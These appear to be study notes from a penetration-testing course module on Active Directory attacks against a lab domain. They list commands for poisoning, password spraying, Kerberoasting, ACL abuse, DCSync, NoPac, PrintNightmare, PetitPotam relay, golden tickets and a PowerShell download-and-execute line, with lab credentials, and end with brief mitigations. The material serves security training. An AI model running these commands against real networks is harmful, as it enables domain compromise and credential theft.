# Active Directory Enumeration & Attacks

## 🎯 Main Idea
- End-to-end methodology for enumerating and attacking a Windows Active Directory domain from zero access to domain/forest compromise.
- Chains recon → credential harvesting → lateral movement → privilege escalation → persistence across a realistic enterprise (INLANEFREIGHT).
- Shows the same attacks from both Linux and Windows attack hosts (plus living-off-the-land).
- Emphasizes enumeration first, abusing misconfigurations, weak credentials, Kerberos, ACLs, and trusts.

## 💥 Attack / Exploit Vectors
### External Recon & Initial Enumeration
- OSINT first (IP/ASN via BGP Toolkit/ARIN, DNS via viewdns, breach data HaveIBeenPwned/Dehashed, GitHub leaks TruffleHog, LinkedIn username harvesting) to build user/password lists.
- Map the domain, hosts, users, and DNS before authenticating; passive LLMNR/NBT-NS analysis.
- **Commands**
  - `nslookup ns1.inlanefreight.com` — resolve IP/domain mapping
  - `fping -asgq 172.16.5.0/23` — ping sweep the segment
  - `sudo nmap -v -A -iL hosts.txt -oN /home/User/Documents/host-enum` — full nmap scan from a host list
  - `sudo tcpdump -i ens224` — capture traffic on an interface
  - `sudo responder -I ens224 -A` — passive LLMNR/NBT-NS/MDNS analysis
  - `./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results` — enumerate valid usernames

### LLMNR / NBT-NS Poisoning
- Spoof name-resolution responses to capture NetNTLMv2 hashes, then crack offline.
- **Commands**
  - `responder -h` — Responder options (Linux)
  - `hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt` — crack NTLMv2
  - `Import-Module .\Inveigh.ps1` / `Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y` — Inveigh (Windows)
  - `.\Inveigh.exe` — C# Inveigh

### Password Spraying & Policy Enumeration
- Enumerate the password policy, build a user list, then spray one password across many accounts to avoid lockout.
- **Commands**
  - `crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol` — enumerate password policy
  - `rpcclient -U "" -N 172.16.5.5` then `querydominfo` / `enumdomusers` — SMB NULL session policy & users
  - `enum4linux -P 172.16.5.5` / `enum4linux-ng -P 172.16.5.5 -oA ilfreight` — policy enumeration
  - `kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1` — spray via kerbrute
  - `sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +` — spray via CME
  - `Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue` — spray from Windows

### Enumerating Security Controls
- Identify defenses (Defender, AppLocker, PowerShell language mode, LAPS) before acting.
- **Commands**
  - `Get-MpComputerStatus` — Windows Defender status
  - `Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections` — AppLocker policy
  - `$ExecutionContext.SessionState.LanguageMode` — PowerShell language mode
  - `Find-LAPSDelegatedGroups` / `Get-LAPSComputers` — LAPS enumeration (LAPSToolkit)

### Credentialed Enumeration (Linux & Windows)
- With valid creds, deeply enumerate users/groups/shares and map attack paths with BloodHound.
- **Commands**
  - `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users / --groups / --shares / --loggedon-users` — CME enumeration
  - `smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5` — share enumeration
  - `sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all` — BloodHound ingest (Linux)
  - `xfreerdp /u:forend@inlanefreight.local /p:Klmcargo2 /v:172.16.5.25` — RDP with creds
  - `windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p transporter@4 --da` — enumerate Domain Admins

### Living Off the Land (Windows)
- Enumerate using built-in tooling and PowerView/SharpHound when you can't drop tools.
- **Commands**
  - `Import-Module ActiveDirectory` / `Get-ADDomain` / `Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName`
  - `Import-Module .\PowerView.ps1` — PowerView (`Get-DomainUser`, `Get-DomainGroup`, `Find-LocalAdminAccess`, `Find-DomainShare`, `Get-DomainTrustMapping`, etc.)
  - `.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data` — hunt sensitive data in shares

### Kerberoasting
- Request TGS tickets for accounts with SPNs and crack them offline for service-account passwords.
- **Commands**
  - `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request` — request all TGS (Linux)
  - `GetUserSPNs.py ... -request-user sqldev -outputfile sqldev_tgs` — target one user
  - `hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force` — crack TGS
  - `.\Rubeus.exe kerberoast /nowrap` / `/user:testspn /nowrap` — Rubeus (Windows)
  - `setspn.exe -Q */*` — enumerate SPNs
  - `Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat` — PowerView request

### ACL Abuse
- Enumerate dangerous ACLs (GenericAll, WriteDACL, ForceChangePassword, etc.) and abuse them to escalate.
- **Commands**
  - `Find-InterestingDomainAcl` — find object ACLs with modify rights
  - `$sid = Convert-NameToSid wley` then `Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}` — rights held by a user
  - `Set-DomainUserPassword -Identity damundsen -AccountPassword $pw -Credential $Cred -Verbose` — force-change a password
  - `Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose` — add to group
  - `Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose` — targeted Kerberoast via fake SPN

### DCSync
- Abuse replication rights (DS-Replication-Get-Changes) to dump NTLM hashes from a DC.
- **Commands**
  - `secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 -use-vss` — DCSync (Linux)
  - `mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator` — DCSync (Windows)

### Privileged Access & Lateral Movement
- Use membership in Remote Desktop / Remote Management Users or MSSQL rights to move and run code.
- **Commands**
  - `Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred` — WinRM/PSSession
  - `evil-winrm -i 10.129.201.234 -u forend` — WinRM from Linux
  - `psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125` / `wmiexec.py ...` — Impacket exec
  - `mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth` then `enable_xp_cmdshell` / `xp_cmdshell whoami /priv` — MSSQL command exec
  - `Get-SQLInstanceDomain` / `Get-SQLQuery ...` — PowerUpSQL

### Kerberos Double Hop Problem
- Explains why WinRM/PSSession creds don't forward to a second hop and workarounds (CredSSP, pass-the-ticket).

### Bleeding-Edge Vulnerabilities
- Exploit recent high-impact AD CVEs to jump straight to SYSTEM/DC.
- **Commands**
  - NoPac: `python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap` then `noPac.py ... -shell --impersonate administrator -use-ldap`
  - PrintNightmare (CVE-2021-1675): `rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'`, host DLL via `smbserver.py`, run `CVE-2021-1675.py inlanefreight.local/<u>:<p>@172.16.5.5 '\\<ip>\CompData\backupscript.dll'`
  - PetitPotam: `PetitPotam.py 172.16.5.225 172.16.5.5` + `ntlmrelayx.py --target http://CA/certsrv/certfnsh.asp --adcs --template DomainController`, then `gettgtpkinit.py` / `getnthash.py` / `secretsdump.py`

### Miscellaneous Misconfigurations
- Exploit everyday misconfigs commonly found in real domains.
- **Commands**
  - GPP passwords: `crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin` / `gpp-decrypt <blob>`
  - GPO abuse: `Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}`
  - ASREPRoasting: `.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat`; `hashcat -m 18200 ...`; `Get-DomainUser -PreauthNotRequired`
  - `Get-DomainUser -UACFilter PASSWD_NOTREQD | Select samaccountname,useraccountcontrol` — PASSWD_NOTREQD accounts
  - `Get-DomainUser * | Select samaccountname,description` — creds in description field
  - Printer bug: `Get-SpoolStatus -ComputerName ACADEMY-EA-DC01...`; `adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r`
  - Exchange abuse / PrivExchange — Exchange Windows Permissions group → WriteDACL → DCSync; relay PushSubscription to LDAP for DA
  - MS14-068 — forge a Kerberos PAC to become Domain Admin (PyKEK/Impacket)
  - Sniffing LDAP credentials from printers/apps ("test connection" → netcat on 389)

### Attacking Domain Trusts
- Abuse intra-forest (child→parent) and cross-forest trusts to escalate to Enterprise Admin or pivot forests.
- **Commands**
  - Child→Parent (SID history / Golden Ticket): `mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt` → `kerberos::golden /user:hacker /domain:LOGISTICS... /sid:... /krbtgt:... /sids:<EnterpriseAdmins SID> /ptt`
  - `ticketer.py -nthash <krbtgt> -domain ... -domain-sid ... -extra-sid <EA SID> hacker` + `export KRB5CCNAME=hacker.ccache` + `psexec.py ... -k -no-pass`
  - `raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm` — automated child→parent
  - `lookupsid.py ...` — SID brute forcing / retrieve domain & EA SIDs
  - Cross-forest: `GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley`; `Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL`; `.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL ...`

### General Commands
- `sudo python3 -m http.server 8001` — host files for transfer
- `"IEX(New-Object Net.WebClient).downloadString('http://172.16.5.222/SharpHound.exe')"` — download file (Windows)
- `impacket-smbserver -ip 172.16.5.x -smb2support -username user -password password shared /path/` — host files over SMB
- `zip -r ilfreight_bh.zip *.json` — package BloodHound JSON for the GUI

## 🛠️ Key Tools & Concepts
- Responder / Inveigh — LLMNR/NBT-NS/MDNS poisoning & hash capture
- kerbrute — fast user enumeration & password spraying via Kerberos pre-auth
- CrackMapExec — swiss-army SMB/LDAP enum, spraying, module execution
- rpcclient / enum4linux(-ng) / ldapsearch / windapsearch — null-session & LDAP enumeration
- BloodHound / SharpHound / bloodhound-python — graph attack paths
- PowerView / PowerUpSQL / LAPSToolkit / Snaffler — Windows LOTL enumeration & data hunting
- Impacket suite — secretsdump, GetUserSPNs, psexec, wmiexec, mssqlclient, ticketer, lookupsid, raiseChild, ntlmrelayx, smbserver
- Rubeus / Mimikatz — Kerberos abuse (Kerberoast, ASREPRoast, Golden/Silver tickets, DCSync, pass-the-ticket)
- hashcat — crack NTLMv2 (5600), TGS (13100), AS-REP (18200)
- evil-winrm / xfreerdp — remote access from Linux
- Kerberos concepts — SPN, TGT/TGS, pre-auth, SID history, double-hop

## 🛡️ Mitigations (only if the module covers them)
- Disable LLMNR and NBT-NS; require SMB signing to stop poisoning/relay
- Enforce strong, unique passwords and account lockout; audit for PASSWD_NOTREQD and creds in description/SYSVOL
- Use LAPS for local admin passwords; use (group) Managed Service Accounts with strong Kerberos (AES) encryption to resist Kerberoasting
- Remove/avoid GPP cPassword; tighten dangerous ACLs and GPO permissions
- Patch bleeding-edge vulns (NoPac, PrintNightmare, PetitPotam/ADCS relay); disable Spooler on DCs
- Tiered administration, limit Domain/Enterprise Admin usage, SID filtering on trusts; regular AD auditing (BloodHound, PingCastle-style reviews)
